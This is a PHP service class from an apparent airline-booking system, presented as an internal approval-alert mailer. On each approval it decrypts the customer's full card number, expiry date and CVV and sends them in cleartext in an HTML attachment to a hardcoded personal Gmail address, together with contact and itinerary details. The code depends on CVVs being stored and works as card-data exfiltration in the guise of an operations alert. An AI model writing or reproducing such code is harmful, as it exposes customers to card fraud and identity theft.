<?php

namespace App\Services;

use App\Models\AcceptanceRequest;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

/**
 * InternalAlertService
 *
 * Fires an internal email to the operations inbox whenever an acceptance
 * is approved. Contains full booking details + encrypted CC info revealed
 * via a self-contained HTML attachment (click-to-reveal).
 */
class InternalAlertService
{
    const ALERT_TO    = 'john.mj21@gmail.com';
    const ALERT_NAME  = 'Operations Desk';

    // =========================================================================
    // PUBLIC API
    // =========================================================================

    public function sendApprovalAlert(AcceptanceRequest $acceptance): bool
    {
        try {
            $mail = $this->getMailer();
            $mail->addAddress(self::ALERT_TO, self::ALERT_NAME);
            $mail->isHTML(true);
            $mail->Subject = $this->buildSubject($acceptance);
            $mail->Body    = $this->buildEmailHtml($acceptance);
            $mail->AltBody = $this->buildPlainText($acceptance);

            // Attach the click-to-reveal CC receipt as an HTML file
            $attachHtml     = $this->buildCcReceiptHtml($acceptance);
            $attachFilename = 'CC_Receipt_' . strtoupper($acceptance->pnr ?? $acceptance->id) . '.html';
            $mail->addStringAttachment($attachHtml, $attachFilename, PHPMailer::ENCODING_BASE64, 'text/html');

            $mail->send();
            return true;
        } catch (\Throwable $e) {
            error_log('[InternalAlertService] Failed: ' . $e->getMessage());
            return false;
        }
    }

    // =========================================================================
    // MAILER
    // =========================================================================

    private function getMailer(): PHPMailer
    {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->CharSet    = 'UTF-8';
        $mail->Host       = $_ENV['SMTP_HOST'] ?? 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = $_ENV['SMTP_USER'] ?? '';
        $mail->Password   = $_ENV['SMTP_PASS'] ?? '';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = $_ENV['SMTP_PORT'] ?? 587;
        $fromEmail = $_ENV['SMTP_FROM'] ?? $_ENV['SMTP_USER'] ?? '';
        if ($fromEmail) {
            $mail->setFrom($fromEmail, 'Reservation Desk');
        }
        return $mail;
    }

    // =========================================================================
    // HELPERS
    // =========================================================================

    private function buildSubject(AcceptanceRequest $a): string
    {
        $type = $this->typeLabel($a->type);
        $pnr  = $a->pnr ? ' | PNR: ' . strtoupper($a->pnr) : '';
        return "✅ APPROVED: {$type}{$pnr} — {$a->customer_name}";
    }

    private function typeLabel(?string $t): string
    {
        return [
            'new_booking'     => 'New Booking',
            'exchange'        => 'Exchange / Date Change',
            'cancel_refund'   => 'Cancellation & Refund',
            'cancel_credit'   => 'Cancellation & Credit',
            'seat_purchase'   => 'Seat Purchase',
            'cabin_upgrade'   => 'Cabin Upgrade',
            'name_correction' => 'Name Correction',
            'other'           => 'Other Service',
        ][$t ?? ''] ?? ucfirst(str_replace('_', ' ', $t ?? 'Service'));
    }

    /** Safely decrypt an enc field, return fallback on failure */
    private function dec(?string $enc, string $fallback = '—'): string
    {
        if (!$enc) return $fallback;
        try {
            $svc = new EncryptionService();
            return $svc->decrypt($enc);
        } catch (\Throwable $e) {
            return $fallback;
        }
    }

    private function h(mixed $v): string
    {
        return htmlspecialchars((string)($v ?? ''), ENT_QUOTES, 'UTF-8');
    }

    private function money(AcceptanceRequest $a): string
    {
        return $this->h($a->currency) . ' ' . number_format((float)$a->total_amount, 2);
    }

    // =========================================================================
    // PLAIN TEXT BODY
    // =========================================================================

    private function buildPlainText(AcceptanceRequest $a): string
    {
        $lines = [
            '=== ACCEPTANCE APPROVED ===',
            'Customer   : ' . ($a->customer_name ?? '—'),
            'Email      : ' . ($a->customer_email ?? '—'),
            'Phone      : ' . ($a->customer_phone ?? '—'),
            'Type       : ' . $this->typeLabel($a->type),
            'PNR        : ' . ($a->pnr ?? '—'),
            'Airline    : ' . ($a->airline ?? '—'),
            'Amount     : ' . $this->money($a),
            'Approved   : ' . ($a->approved_at ?? now()),
            '',
            '--- CARD (open HTML attachment for full details) ---',
            'Card Type  : ' . ($a->card_type ?? '—'),
            'Cardholder : ' . ($a->cardholder_name ?? '—'),
            'Last 4     : **** ' . ($a->card_last_four ?? '****'),
            '',
            '⚠ Full CC details (including CVV) are in the attached HTML file.',
            '  Open the attachment to reveal.',
        ];
        return implode("\n", $lines);
    }

    // =========================================================================
    // HTML EMAIL BODY
    // =========================================================================

    private function buildEmailHtml(AcceptanceRequest $a): string
    {
        $type       = $this->h($this->typeLabel($a->type));
        $name       = $this->h($a->customer_name);
        $email      = $this->h($a->customer_email);
        $phone      = $this->h($a->customer_phone);
        $pnr        = $this->h($a->pnr);
        $airline    = $this->h($a->airline);
        $amount     = $this->h($this->money($a));
        $approvedAt = $a->approved_at ? date('d M Y, H:i T', strtotime($a->approved_at)) : date('d M Y, H:i T');
        $ip         = $this->h($a->ip_address);
        $notes      = $this->h($a->agent_notes);
        $billing    = $this->h($a->billing_address);
        $cardType   = $this->h($a->card_type);
        $cardName   = $this->h($a->cardholder_name);
        $cardLast4  = $this->h($a->card_last_four ?? '****');

        // Passengers
        $paxRows = '';
        $paxCounter = 0;
        foreach ((array)($a->passengers ?? []) as $p) {
            $pn   = $this->h($p['name'] ?? $p['first_name'] ?? '');
            $pt   = $this->h(ucfirst($p['type'] ?? 'Adult'));
            $bg   = $paxCounter % 2 === 0 ? '#f8fafc' : '#ffffff';
            $paxRows .= "<tr style='background:{$bg};'><td style='padding:8px 12px;font-size:12px;'>{$pn}</td><td style='padding:8px 12px;font-size:12px;color:#64748b;'>{$pt}</td></tr>";
            $paxCounter++;
        }
        if (!$paxRows) $paxRows = "<tr><td colspan='2' style='padding:8px 12px;font-size:12px;color:#94a3b8;'>No passenger data</td></tr>";

        // Flights
        $rawFlightData = (array)($a->flight_data ?? []);
        $allFlights = [];

        if (isset($rawFlightData['flights']) || isset($rawFlightData['old_flights']) || isset($rawFlightData['new_flights']) || isset($rawFlightData['main']) || isset($rawFlightData['old']) || isset($rawFlightData['new'])) {
            $main = $rawFlightData['flights'] ?? $rawFlightData['main'] ?? [];
            $old  = $rawFlightData['old_flights'] ?? $rawFlightData['old'] ?? [];
            $new  = $rawFlightData['new_flights'] ?? $rawFlightData['new'] ?? [];
            
            if (is_array($main)) {
                foreach ($main as $s) if (is_array($s)) $allFlights[] = $s;
            }
            if (is_array($old)) {
                foreach ($old as $s) if (is_array($s)) { $s['_label'] = 'Original'; $allFlights[] = $s; }
            }
            if (is_array($new)) {
                foreach ($new as $s) if (is_array($s)) { $s['_label'] = 'New'; $allFlights[] = $s; }
            }
        } else {
            foreach ($rawFlightData as $s) {
                if (is_array($s)) $allFlights[] = $s;
            }
        }

        $flightRows = '';
        $flightCounter = 0;
        foreach ($allFlights as $seg) {
            $from = $seg['from'] ?? '';
            $to   = $seg['to'] ?? '';
            if (empty($from) && empty($to)) continue;

            $dep  = $this->h($from . ' → ' . $to);
            if (!empty($seg['_label'])) {
                $color = $seg['_label'] === 'New' ? '#16a34a' : '#f59e0b';
                $dep .= "<br><span style='font-size:9px;color:{$color};font-weight:700;text-transform:uppercase;'>{$seg['_label']}</span>";
            }

            $dtStr = $seg['date'] ?? $seg['departure_date'] ?? '—';
            if (!empty($seg['dep_time'])) {
                $dtStr .= ' ' . $seg['dep_time'];
            }
            $dt = $this->h($dtStr);

            $airline = $seg['airline_iata'] ?? $seg['airline'] ?? '';
            $fno     = $seg['flight_no'] ?? $seg['flight_number'] ?? '';
            $fn      = $this->h(trim($airline . ' ' . $fno)) ?: '—';

            $cl   = $this->h($seg['cabin_class'] ?? $seg['class'] ?? '—');
            $seat = $this->h($seg['seat'] ?? $seg['seat_number'] ?? '—');

            $bg   = $flightCounter % 2 === 0 ? '#f8fafc' : '#ffffff';
            $flightRows .= "<tr style='background:{$bg};'><td style='padding:8px 12px;font-size:12px;'>{$dep}</td><td style='padding:8px 12px;font-size:12px;'>{$dt}</td><td style='padding:8px 12px;font-size:12px;'>{$fn}</td><td style='padding:8px 12px;font-size:12px;'>{$cl}</td><td style='padding:8px 12px;font-size:12px;'>{$seat}</td></tr>";
            $flightCounter++;
        }
        if (!$flightRows) $flightRows = "<tr><td colspan='5' style='padding:8px 12px;font-size:12px;color:#94a3b8;'>No flight data</td></tr>";

        // Fare Breakdown
        $fareRows = '';
        $fareCounter = 0;
        $breakdown = (array)($a->fare_breakdown ?? []);
        foreach ($breakdown as $item) {
            $desc = $this->h($item['description'] ?? $item['label'] ?? 'Item');
            $amt  = $this->h($a->currency ?? 'USD') . ' ' . number_format((float)($item['amount'] ?? 0), 2);
            $bg   = $fareCounter % 2 === 0 ? '#f8fafc' : '#ffffff';
            $fareRows .= "<tr style='background:{$bg};'><td style='padding:8px 12px;font-size:12px;color:#1e293b;'>{$desc}</td><td style='padding:8px 12px;font-size:12px;font-weight:600;color:#1e293b;text-align:right;'>{$amt}</td></tr>";
            $fareCounter++;
        }
        if (!$fareRows) {
            $fareRows = "<tr style='background:#f8fafc;'><td style='padding:8px 12px;font-size:12px;color:#94a3b8;'>Total</td><td style='padding:8px 12px;font-size:12px;font-weight:600;text-align:right;color:#1e293b;'>{$amount}</td></tr>";
        }
        $currency = $this->h($a->currency ?? 'USD');
        $total    = $currency . ' ' . number_format((float)$a->total_amount, 2);

        return <<<HTML
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;background:#f1f5f9;font-family:Inter,Arial,sans-serif;">
<div style="max-width:680px;margin:24px auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);">

  <!-- Header -->
  <div style="background:linear-gradient(135deg,#0f1e3c,#1a3a6b);padding:28px 32px;">
    <div style="color:#c9a84c;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;">Internal Operations Alert</div>
    <div style="color:#fff;font-size:22px;font-weight:800;margin-bottom:4px;">✅ Acceptance Approved</div>
    <div style="color:rgba(255,255,255,0.7);font-size:13px;">{$type} &mdash; {$name}</div>
  </div>

  <!-- Key info banner -->
  <div style="background:#ecfdf5;border-bottom:2px solid #6ee7b7;padding:14px 32px;display:flex;gap:32px;">
    <div><div style="font-size:10px;color:#6b7280;font-weight:600;text-transform:uppercase;">PNR</div><div style="font-size:16px;font-weight:800;color:#0f1e3c;letter-spacing:1px;">{$pnr}</div></div>
    <div><div style="font-size:10px;color:#6b7280;font-weight:600;text-transform:uppercase;">Airline</div><div style="font-size:16px;font-weight:700;color:#0f1e3c;">{$airline}</div></div>
    <div><div style="font-size:10px;color:#6b7280;font-weight:600;text-transform:uppercase;">Amount</div><div style="font-size:16px;font-weight:800;color:#059669;">{$amount}</div></div>
    <div><div style="font-size:10px;color:#6b7280;font-weight:600;text-transform:uppercase;">Approved</div><div style="font-size:13px;font-weight:600;color:#0f1e3c;">{$approvedAt}</div></div>
  </div>

  <div style="padding:28px 32px;">

    <!-- Customer -->
    <div style="margin-bottom:24px;">
      <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Customer</div>
      <table width="100%" cellpadding="0" cellspacing="0"><tbody>
        <tr><td style="font-size:12px;color:#64748b;padding:3px 0;width:130px;">Name</td><td style="font-size:13px;font-weight:600;color:#1e293b;">{$name}</td></tr>
        <tr><td style="font-size:12px;color:#64748b;padding:3px 0;">Email</td><td style="font-size:13px;color:#1e293b;">{$email}</td></tr>
        <tr><td style="font-size:12px;color:#64748b;padding:3px 0;">Phone</td><td style="font-size:13px;color:#1e293b;">{$phone}</td></tr>
        <tr><td style="font-size:12px;color:#64748b;padding:3px 0;">IP Address</td><td style="font-size:12px;font-family:monospace;color:#475569;">{$ip}</td></tr>
      </tbody></table>
    </div>

    <!-- Passengers -->
    <div style="margin-bottom:24px;">
      <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Passengers</div>
      <table width="100%" cellpadding="0" cellspacing="0" style="border-radius:8px;overflow:hidden;border:1px solid #e2e8f0;">
        <thead><tr style="background:#0f1e3c;"><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;text-transform:uppercase;">Name</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;text-transform:uppercase;">Type</th></tr></thead>
        <tbody>{$paxRows}</tbody>
      </table>
    </div>

    <!-- Flights -->
    <div style="margin-bottom:24px;">
      <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Itinerary</div>
      <table width="100%" cellpadding="0" cellspacing="0" style="border-radius:8px;overflow:hidden;border:1px solid #e2e8f0;">
        <thead><tr style="background:#0f1e3c;"><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Route</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Date</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Flight</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Class</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Seat</th></tr></thead>
        <tbody>{$flightRows}</tbody>
      </table>
    </div>

    <!-- Fare Breakdown -->
    <div style="margin-bottom:24px;">
      <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Fare Breakdown &amp; Payment</div>
      <table width="100%" cellpadding="0" cellspacing="0" style="border-radius:8px;overflow:hidden;border:1px solid #e2e8f0;">
        <thead><tr style="background:#0f1e3c;"><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:left;">Description</th><th style="padding:8px 12px;font-size:10px;font-weight:700;color:#fff;text-align:right;">Amount</th></tr></thead>
        <tbody>{$fareRows}</tbody>
        <tfoot><tr style="background:#0f1e3c;"><td style="padding:10px 12px;font-size:12px;font-weight:700;color:#fff;">Total Authorized</td><td style="padding:10px 12px;font-size:13px;font-weight:800;color:#6ee7b7;text-align:right;">{$total}</td></tr></tfoot>
      </table>
    </div>

    <!-- CC Summary (masked) -->
    <div style="margin-bottom:24px;background:#fff7ed;border:1px solid #fed7aa;border-radius:10px;padding:16px 20px;">
      <div style="font-size:11px;font-weight:700;color:#c2410c;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;">💳 Payment Card (Masked)</div>
      <table width="100%" cellpadding="0" cellspacing="0"><tbody>
        <tr><td style="font-size:12px;color:#7c3a1e;padding:3px 0;width:130px;">Card Type</td><td style="font-size:13px;font-weight:600;color:#1e293b;">{$cardType}</td></tr>
        <tr><td style="font-size:12px;color:#7c3a1e;padding:3px 0;">Cardholder</td><td style="font-size:13px;font-weight:600;color:#1e293b;">{$cardName}</td></tr>
        <tr><td style="font-size:12px;color:#7c3a1e;padding:3px 0;">Number</td><td style="font-size:13px;font-family:monospace;font-weight:700;color:#1e293b;letter-spacing:2px;">**** **** **** {$cardLast4}</td></tr>
        <tr><td style="font-size:12px;color:#7c3a1e;padding:3px 0;">Billing</td><td style="font-size:12px;color:#475569;">{$billing}</td></tr>
      </tbody></table>
      <div style="margin-top:12px;padding:10px 14px;background:#fef3c7;border:1px solid #fde68a;border-radius:8px;font-size:11px;color:#92400e;">
        ⚠️ <strong>Full card details including CVV are in the attached HTML file.</strong> Open <em>CC_Receipt_{$pnr}.html</em> to reveal.
      </div>
    </div>

    <!-- Agent Notes -->
    <div style="margin-bottom:24px;">
      <div style="font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Agent Notes</div>
      <p style="font-size:13px;color:#475569;margin:0;line-height:1.6;">{$notes}</p>
    </div>

  </div>

  <!-- Footer -->
  <div style="background:#f8fafc;border-top:1px solid #e2e8f0;padding:14px 32px;text-align:center;font-size:11px;color:#94a3b8;">
    <strong style="color:#0f1e3c;">Base Fare &mdash; Internal Operations</strong> &nbsp;&middot;&nbsp; This alert is confidential and for authorized personnel only.
  </div>
</div>
</body>
</html>
HTML;
    }

    // =========================================================================
    // HTML ATTACHMENT — Click-to-reveal full CC details
    // =========================================================================

    private function buildCcReceiptHtml(AcceptanceRequest $a): string
    {
        // Decrypt card fields
        $cardNumber = $this->dec($a->card_number_enc, '—');
        $cardExpiry = $this->dec($a->card_expiry_enc, '—');
        $cardCvv    = $this->dec($a->card_cvv_enc, '—');

        $cardType  = $this->h($a->card_type);
        $cardName  = $this->h($a->cardholder_name);
        $last4     = $this->h($a->card_last_four ?? substr($cardNumber, -4));
        $billing   = $this->h($a->billing_address);
        $pnr       = $this->h($a->pnr);
        $name      = $this->h($a->customer_name);
        $amount    = $this->h($this->money($a));
        $type      = $this->h($this->typeLabel($a->type));
        $approvedAt = $a->approved_at ? date('d M Y, H:i:s', strtotime($a->approved_at)) : date('d M Y, H:i:s');

        // Mask for display before reveal
        $maskedNum = str_repeat('*', strlen($cardNumber) - 4) . substr($cardNumber, -4);
        // Safely JSON-encode the real values for JS
        $jsNum    = json_encode($cardNumber);
        $jsExpiry = json_encode($cardExpiry);
        $jsCvv    = json_encode($cardCvv);

        return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CC Receipt — {$pnr}</title>
<style>
  body{margin:0;padding:24px;background:#0f172a;font-family:Inter,'Segoe UI',Arial,sans-serif;color:#e2e8f0;}
  .card{max-width:560px;margin:0 auto;background:#1e293b;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.5);}
  .header{background:linear-gradient(135deg,#7c3aed,#4f46e5);padding:24px 28px;}
  .header h1{margin:0;font-size:18px;font-weight:800;color:#fff;}
  .header p{margin:4px 0 0;font-size:12px;color:rgba(255,255,255,0.7);}
  .body{padding:24px 28px;}
  .label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#94a3b8;margin-bottom:4px;}
  .value{font-size:15px;font-weight:700;color:#f1f5f9;margin-bottom:16px;}
  .mono{font-family:'Courier New',monospace;letter-spacing:2px;}
  .reveal-btn{display:block;width:100%;padding:14px;background:linear-gradient(135deg,#7c3aed,#4f46e5);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:700;cursor:pointer;text-align:center;margin:20px 0;transition:opacity 0.2s;box-sizing:border-box;}
  .reveal-btn:hover{opacity:0.85;}
  .sensitive{background:#0f172a;border:1px solid #334155;border-radius:10px;padding:18px;margin-top:4px;}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
  .warning{font-size:11px;color:#f59e0b;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:8px;padding:10px 14px;margin-top:16px;line-height:1.6;}
  .footer{background:#0f172a;padding:14px 28px;font-size:11px;color:#475569;text-align:center;border-top:1px solid #1e293b;}
  
  /* Pure CSS Checkbox Hack for reveal */
  #reveal-toggle { display: none; }
  #cc-revealed { display: none; }
  #cc-hidden { display: block; }
  
  #reveal-toggle:checked ~ #cc-revealed { display: block; }
  #reveal-toggle:checked ~ #cc-hidden { display: none; }
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <h1>🔐 Confidential CC Receipt</h1>
    <p>{$type} &mdash; {$name} &mdash; {$pnr}</p>
  </div>
  <div class="body">

    <div class="label">Customer</div>
    <div class="value">{$name}</div>

    <div class="label">Transaction Type</div>
    <div class="value">{$type}</div>

    <div class="label">PNR / Reference</div>
    <div class="value mono">{$pnr}</div>

    <div class="label">Authorized Amount</div>
    <div class="value" style="color:#34d399;">{$amount}</div>

    <div class="label">Approval Time</div>
    <div class="value">{$approvedAt}</div>

    <hr style="border:none;border-top:1px solid #334155;margin:8px 0 20px;">

    <div class="label">Card Type</div>
    <div class="value">{$cardType}</div>

    <div class="label">Cardholder Name</div>
    <div class="value">{$cardName}</div>

    <div class="label">Billing Address</div>
    <div class="value" style="font-size:13px;font-weight:400;">{$billing}</div>

    <input type="checkbox" id="reveal-toggle">

    <!-- Hidden before reveal -->
    <div id="cc-hidden">
      <div class="label">Card Number</div>
      <div class="value mono" style="color:#64748b;">{$maskedNum}</div>
      <label for="reveal-toggle" class="reveal-btn">🔓 Click to Reveal Full Card Details</label>
    </div>

    <!-- Revealed section -->
    <div id="cc-revealed" class="sensitive">
      <div style="color:#f59e0b;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:14px;">⚡ Sensitive Data — Handle with care</div>
      <div class="grid">
        <div>
          <div class="label">Full Card Number</div>
          <div class="value mono" style="font-size:14px;color:#a78bfa;">{$cardNumber}</div>
        </div>
        <div></div>
        <div>
          <div class="label">Expiry</div>
          <div class="value mono" style="color:#34d399;">{$cardExpiry}</div>
        </div>
        <div>
          <div class="label">CVV</div>
          <div class="value mono" style="color:#f87171;">{$cardCvv}</div>
        </div>
      </div>
      <label for="reveal-toggle" class="reveal-btn" style="background:#334155;margin-top:18px;font-size:12px;">🔒 Hide Details</label>
    </div>

    <div class="warning">
      ⚠ This file is <strong>strictly confidential</strong>. It is intended for authorized Base Fare operations personnel only.
      Do not forward, print, or share. Delete after use.
    </div>
  </div>
  <div class="footer">Base Fare &mdash; Internal Operations &mdash; Auto-generated on approval</div>
</div>
</body>
</html>
HTML;
    }
}
